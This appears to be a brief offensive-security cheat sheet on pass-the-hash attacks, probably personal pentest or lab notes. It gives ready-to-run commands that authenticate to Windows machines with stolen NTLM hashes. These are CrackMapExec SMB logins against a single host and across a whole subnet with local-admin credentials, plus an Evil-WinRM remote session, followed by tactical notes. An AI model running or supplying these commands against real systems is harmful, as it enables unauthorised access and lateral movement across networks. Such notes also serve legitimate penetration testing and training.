# Pass-the-Hash

Goal: Authenticate using NTLM hash instead of plaintext password.

---

# CrackMapExec PTH

crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

---

# CrackMapExec Local Auth PTH

sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

---

# Evil-WinRM PTH

evil-winrm -i <ip> -u Administrator -H "<hash>"

---

# Tactical Notes

- No cracking required.
- Only works with NTLM.
- Useful when password complexity is high.
